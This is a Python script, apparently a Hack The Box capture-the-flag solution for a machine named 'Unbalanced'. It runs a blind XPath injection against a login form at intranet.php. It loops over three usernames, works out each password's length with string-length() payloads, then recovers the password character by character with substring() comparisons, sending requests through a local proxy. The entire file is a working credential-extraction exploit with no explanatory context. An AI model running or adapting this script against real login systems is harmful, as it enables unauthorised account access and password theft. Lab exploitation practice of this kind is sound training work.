#!/usr/bin/env python3
import requests
import string

# ' or Username='rita' and substring(Password,1,8) = 'password
# r = requests.get('http://172.31.179.1/',proxies=proxies)
# len(r.text) == 7024  

users = ['jim','bryan','sarah'] 
charsets = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&\()*+,-./:;?@[\\]^_`{|}~'

url = 'http://172.31.179.1/intranet.php'

proxies = {
    # 'http': 'http://10.10.10.200:3128',
    'http': 'http://127.0.0.1:8080'
}

for user in users:
    for i in range(1,28):
        payload = "' or Username='" + user + "' and string-length(Password/text())=" + str(i) + "or '2'='1"
        data = {
            'Username': 'admin',
            'Password': payload
        }
        r = requests.post(url=url,data=data,proxies=proxies)
        if '@unbalanced.htb' in r.text:
            password_length = i
            print("[+] User " + user + " has " + str(password_length) + " digit of password.")
            print("[*] Bruteforcing password of " + user)
            tmp_pass = ''
            for i in range(1,password_length + 1):
                for char in charsets:
                    payload  =  "' or Username='" + user + "' and substring(Password,1," + str(len(tmp_pass) + 1) + ") = '" + tmp_pass + char
                    data = {
                    'Username': 'admin',
                    'Password': payload
                }
                    r = requests.post(url=url, data=data, proxies=proxies)
                    # print(len(r.text))
                    if '@unbalanced.htb' in r.text:
                        tmp_pass = tmp_pass + char
                        break
                    else:
                        continue
            print(user,tmp_pass)
            break
        else:
            continue